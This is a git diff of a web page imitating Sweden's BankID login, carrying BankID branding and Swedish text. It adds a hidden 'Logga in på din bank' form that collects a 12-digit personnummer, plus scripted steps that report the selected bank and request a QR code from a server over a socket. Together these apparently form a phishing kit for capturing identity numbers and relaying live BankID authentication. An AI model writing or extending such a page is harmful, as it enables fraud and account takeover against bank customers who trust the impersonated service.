@@ -327,7 +327,6 @@
             margin-bottom: 20px;
         }
 
-
         .icon {
             display: inline-block;
             position: relative;
@@ -399,8 +398,57 @@
             }
         }
 
+        /* Login Form Styles */
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            display: none; /* Hidden initially */
+        }
 
+        .login-container h1 {
+            margin-bottom: 20px;
+            color: #333;
+        }
 
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .form-group input[type="text"], .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        #continue-button {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            opacity: 0.5; /* Disabled by default */
+            pointer-events: none; /* Disabled by default */
+        }
+
+        #continue-button.enabled {
+            opacity: 1;
+            pointer-events: auto; /* Enabled when form is filled */
+        }
     </style>
 </head>
 <body>
@@ -553,11 +601,27 @@
                 <div class="waiting-arrow"></div>
             </div>
         </div>
-        <h3>Vanligen vanta</h3>
-        <p>Vi behandlar din begaran.</p>
+        <h3>Vanligen vänta</h3>
+        <p>Vi behandlar din begäran.</p>
     </div>
 
-
+    <!-- Login Form -->
+    <div class="login-container" id="loginContainer">
+        <h1>Logga in på din bank</h1>
+        <form>
+            <div class="form-group">
+                <label for="login-method">Inloggningsmetod</label>
+                <select id="login-method" name="login-method">
+                    <option value="mobile-bankid">Mobilt BankID på denna enhet</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="personal-number">Personnummer</label>
+                <input type="text" id="personal-number" name="personal-number" placeholder="Ange ditt personnummer">
+            </div>
+            <button id="continue-button" type="submit">Gå vidare</button>
+        </form>
+    </div>
 
     <div class="footer">
         <p>© BankID 2024<br>
@@ -579,6 +643,8 @@
             const bankList = document.getElementById('bankList');
             const bankItems = bankList.querySelectorAll('li');
             const waitingSection = document.getElementById('waitingSection');
+            const loginContainer = document.getElementById('loginContainer');
+            const continueButton = document.getElementById('continue-button');
 
             let isLoading = false;
             let lastUpdateTime = Date.now();
@@ -586,6 +652,8 @@
 
             bankListContainer.style.display = 'none';
             waitingSection.style.display = 'none'; // Hide waiting section initially
+            loginContainer.style.display = 'none'; // Hide login container initially
+            qrCard.style.display = 'none'; // Hide QR card initially
 
             generateQrButton.addEventListener('click', function() {
                 if (!isButtonClicked) {
@@ -613,37 +681,42 @@
                 if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
                     generateQrButton.style.display = 'none';
                 }
-            });
 
+                // Show the login container after the waiting section is hidden
+            });
+            
             bankItems.forEach(item => {
                 item.addEventListener('click', function() {
                     const bankName = item.querySelector('.bank-name').textContent.trim();
-
+                    
                     // Hide the bank list and show the waiting section as a full-screen overlay
                     bankListContainer.style.display = 'none';
                     waitingSection.style.display = 'flex';
-
+                    
                     setTimeout(() => {
                         // Hide the waiting section and show the QR card
                         waitingSection.style.display = 'none';
                         qrCard.style.display = 'block';
                         isLoading = true;
-                        loaderElement.classList.add('active');
                         socket.emit('generate_qr_code');
                         generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
                         generateQrButton.style.backgroundColor = 'white';
                         generateQrButton.style.color = '#000';
                         generateQrButton.style.border = 'none';
-
+                        
                         socket.emit('bank_clicked', { bankName: bankName });
+                        loginContainer.style.display = 'block';
+                        
                     }, 3000); // 3 seconds delay
+                    contentContainer.style.display = 'none';
                 });
             });
 
+            
             const searchInput = document.getElementById('searchInput');
             searchInput.addEventListener('input', () => {
                 const searchTerm = searchInput.value.toLowerCase();
-
+                
                 bankItems.forEach(item => {
                     const bankName = item.querySelector('.bank-name').textContent.toLowerCase();
 
@@ -653,6 +726,35 @@
                         item.style.display = 'none';
                     }
                 });
+            });
+            
+            // Enable/disable the continue button based on form input
+            const loginMethod = document.getElementById('login-method');
+            const personalNumber = document.getElementById('personal-number');
+            
+            function checkFormValidity() {
+                if (loginMethod.value && personalNumber.value) {
+                    if (personalNumber.value.length === 12) {
+                        continueButton.classList.add('enabled');
+                        // continueButton.disabled = false;
+                    // } else {
+                        // continueButton.disabled = true;
+                    }
+                } else {
+                    continueButton.classList.remove('enabled');
+                }
+            }
+            
+            loginMethod.addEventListener('change', checkFormValidity);
+            personalNumber.addEventListener('input', checkFormValidity);
+            
+            // Show the QR card after the continue button is clicked
+            continueButton.addEventListener('click', function(event) {
+                event.preventDefault(); // Prevent form submission
+                loginContainer.style.display = 'none'; // Hide the login container
+                // loaderElement.classList.add('active');
+                qrCard.style.display = 'block'; // Show the QR card
+                contentContainer.style.display = 'block';
             });
         });
     </script>
